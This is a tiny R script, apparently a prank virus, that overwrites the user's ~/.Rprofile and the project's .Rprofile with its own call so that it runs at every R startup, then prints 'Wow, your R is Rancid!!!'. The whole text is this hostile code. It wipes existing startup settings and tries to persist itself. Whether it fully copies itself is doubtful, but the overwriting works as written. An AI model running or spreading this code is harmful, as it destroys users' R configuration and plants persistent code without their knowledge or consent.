{
    function() {
        rp_paths <- c("~/.Rprofile", paste0(getwd(), "/.Rprofile"))
        inject <- function(rp, code) {
            write(code, file = rp, append = FALSE)
        }
        lapply(rp_paths, inject, code = deparse(match.call()))
        cat("Wow, your R is Rancid!!!\n")
    }
}()
